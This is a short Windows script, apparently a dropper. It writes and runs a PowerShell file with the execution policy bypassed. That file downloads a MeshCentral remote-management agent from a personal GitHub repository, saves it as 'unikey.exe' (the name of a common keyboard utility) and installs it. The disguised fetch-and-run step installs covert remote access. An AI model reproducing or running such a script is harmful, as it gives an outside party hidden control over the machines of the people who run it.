echo "$Url = 'https://github.com/Ngophuthanh1990/thanh/raw/main/meshagent64-Kuanhngo%20(1).exe';[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";$ProgressPreference = 'SilentlyContinue';Invoke-WebRequest $Url -OutFile unikey.exe;.\unikey.exe -fullinstall
" > install.ps1 
powershell.exe -ExecutionPolicy Bypass -File install.ps1
exit